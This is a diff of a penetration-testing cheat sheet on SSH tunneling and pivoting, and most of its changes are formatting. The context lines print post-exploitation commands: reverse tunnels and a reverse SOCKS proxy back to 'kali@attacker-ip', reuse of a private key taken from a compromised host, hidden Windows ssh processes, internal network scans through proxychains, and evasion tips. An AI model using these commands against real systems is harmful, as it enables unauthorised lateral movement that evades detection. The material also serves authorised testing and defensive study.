@@ -1,14 +1,15 @@
 # SSH Tunneling - Living Off The Land
 
-**Author:** Julien Bongars  
+**Author:** Julien Bongars\
 **Date:** 2025-12-30 00:02:04
-**Path:** 
+**Path:**
 
 ---
 
 ## SSH Tunnel Types
 
 ### Local Port Forward (-L)
+
 **Use Case**: Access a service on the target's network from your machine.
 
 ```bash
@@ -28,6 +29,7 @@ ssh -f -N -L 8080:internal-host:80 user@pivot-host
 ```
 
 ### Remote Port Forward (-R) - Reverse Tunnel
+
 **Use Case**: You have a shell on target but want to access services on target's network from your machine. Target connects back to YOU.
 
 ```bash
@@ -41,6 +43,7 @@ ssh -R 8080:192.168.1.10:80 -p 443 kali@attacker-ip
 ```
 
 ### Dynamic Port Forward (-D) - SOCKS Proxy
+
 **Use Case**: Route all traffic through target (scan entire network, use any tool).
 
 ```bash
@@ -56,9 +59,10 @@ proxychains crackmapexec smb 192.168.1.0/24
 proxychains curl http://192.168.1.50
 ```
 
-## Tunneling 
+## Tunneling
 
 ### Double Pivot
+
 ```bash
 # First pivot
 ssh -L 2222:second-pivot:22 user@first-pivot
@@ -71,6 +75,7 @@ curl http://localhost:8080
 ```
 
 ### ProxyJump (Cleaner Double Pivot)
+
 ```bash
 # Modern SSH supports ProxyJump
 ssh -F path/to/ssh/config.conf -J user1@pivot1,user2@pivot2 user3@final-target
@@ -83,6 +88,7 @@ Host final
 ```
 
 ### SSH Config File Method
+
 ```bash
 # Edit ~/.ssh/config
 Host pivot
@@ -97,6 +103,7 @@ ssh -F path/to/the/ssh/config.conf pivot
 ```
 
 ### Reverse SOCKS Tunnel (Post-Exploitation)
+
 ```bash
 # Critical for post-exploitation when you have RCE
 # Requires GatewayPorts yes in /etc/ssh/sshd_config on attacker machine
@@ -129,6 +136,7 @@ nohup ssh -R 1080 -o ServerAliveInterval=60 kali@attacker-ip &
 ## Troubleshooting
 
 ### Keep Alive (Prevent Timeout)
+
 ```bash
 # Add keep-alive options (critical for unstable connections)
 ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 1080 user@pivot
@@ -147,6 +155,7 @@ Host *
 ```
 
 ### Compression (Slow Links)
+
 ```bash
 # Enable compression
 ssh -C -D 1080 user@pivot
@@ -155,6 +164,7 @@ ssh -C -D 1080 user@pivot
 ## SSH Without Password
 
 ### Using SSH Keys
+
 ```bash
 # Generate key pair (if needed)
 ssh-keygen -t ed25519
@@ -170,6 +180,7 @@ ssh -D 1080 user@pivot-host
 ```
 
 ### Using Compromised Private Key
+
 ```bash
 # Found id_rsa on compromised host
 chmod 600 id_rsa
@@ -181,11 +192,13 @@ ssh -i id_rsa -D 1080 user@next-target
 ## Windows SSH (Windows 10+)
 
 ### Check if SSH Client Available
+
 ```powershell
 Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*'
 ```
 
 ### Windows SSH Tunnel
+
 ```powershell
 # Same syntax as Linux
 
@@ -196,6 +209,7 @@ Start-Process ssh -ArgumentList "-D 1080 user@pivot-host" -WindowStyle Hidden
 ## Proxychains Configuration
 
 ### Edit /etc/proxychains4.conf
+
 ```bash
 # Comment out existing proxy
 # Add your SOCKS5 proxy
@@ -206,6 +220,7 @@ proxychains4 -f /path/to/custom.conf nmap -sT 192.168.1.0/24
 ```
 
 ### Proxychains Tips
+
 ```bash
 # Use TCP connect scan (-sT) with proxychains, not SYN scan
 proxychains nmap -sT -Pn 192.168.1.10
@@ -311,6 +326,7 @@ proxychains ssh -L 5432:postgres.internal:5432 admin@192.168.10.50
 ### Using Built-in Tools
 
 #### Netsh (Windows)
+
 ```cmd
 # Port forwarding on Windows (requires admin)
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10
@@ -323,6 +339,7 @@ netsh interface portproxy delete v4tov4 listenport=8080
 ```
 
 #### Socat (If Available)
+
 ```bash
 # Check if socat installed
 which socat
@@ -335,6 +352,7 @@ socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80 &
 ```
 
 #### Iptables (Linux with root)
+
 ```bash
 # Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -347,6 +365,7 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 ### SSH Alternatives (Stealthy)
 
 #### Using RDP for Tunneling
+
 ```bash
 # If RDP available, can tunnel through it
 xfreerdp /v:target /u:user /p:pass /drive:share,/tmp
@@ -355,6 +374,7 @@ xfreerdp /v:target /u:user /p:pass /drive:share,/tmp
 ```
 
 #### Windows Remote Management (WinRM)
+
 ```powershell
 # If WinRM available (port 5985/5986)
 # Can use for remote code execution
@@ -366,6 +386,7 @@ Enter-PSSession -ComputerName target -Credential (Get-Credential)
 ### Using Built-in Tools
 
 ### Why SSH Tunneling is Stealthy
+
 1. **No binary drops** - Uses pre-installed tools
 2. **Legitimate traffic** - SSH is expected in enterprises
 3. **Encrypted** - Traffic inspection won't see payloads
@@ -373,6 +394,7 @@ Enter-PSSession -ComputerName target -Credential (Get-Credential)
 5. **No persistence** - Tunnel dies when session ends
 
 ### Detection Points
+
 - SSH connections to unusual hosts
 - SSH connections from unusual users
 - Long-duration SSH sessions
@@ -380,6 +402,7 @@ Enter-PSSession -ComputerName target -Credential (Get-Credential)
 - SSH connections at unusual times
 
 ### Evasion Tips
+
 ```bash
 # Use non-standard SSH port (if available)
 ssh -p 2222 -D 1080 user@pivot
@@ -397,6 +420,7 @@ ssh -D 1080 hacker123@pivot  # This
 ## Quick Reference
 
 ### Most Common Commands
+
 ```bash
 # SOCKS proxy (most versatile)
 ssh -D 1080 user@pivot
@@ -417,12 +441,14 @@ proxychains nmap -sT 192.168.1.0/24
 ### When to Use SSH vs Chisel
 
 **Use SSH when**:
+
 - ✅ SSH is already installed on target
 - ✅ Stealth is priority
 - ✅ You have SSH credentials or keys
 - ✅ SSH traffic is normal in environment
 
 **Use Chisel when**:
+
 - ✅ No SSH available (Windows servers)
 - ✅ Don't have SSH credentials
 - ✅ Need HTTP-based tunnel (firewall bypass)
@@ -432,6 +458,7 @@ proxychains nmap -sT 192.168.1.0/24
 ## Troubleshooting
 
 ### Connection Refused
+
 ```bash
 # Check if SSH running on pivot
 nmap -p 22 pivot-host
@@ -441,6 +468,7 @@ ssh -v -D 1080 user@pivot
 ```
 
 ### Permission Denied
+
 ```bash
 # Check credentials
 ssh user@pivot  # Test basic connection first
@@ -450,6 +478,7 @@ ssh -o PreferredAuthentications=password -D 1080 user@pivot
 ```
 
 ### GatewayPorts Error
+
 ```bash
 # If remote forward fails, check sshd_config on remote
 # Need: GatewayPorts yes
@@ -459,6 +488,7 @@ ssh -R 8080:localhost:80 user@pivot
 ```
 
 ### Proxychains Not Working
+
 ```bash
 # Verify SOCKS proxy is running
 netstat -tulpn | grep 1080
@@ -472,4 +502,4 @@ proxychains4 -v nmap -sT 192.168.1.10
 
 ## Additional Resources
 
-**Proxychains**  https://github.com/haad/proxychains
+**Proxychains** https://github.com/haad/proxychains
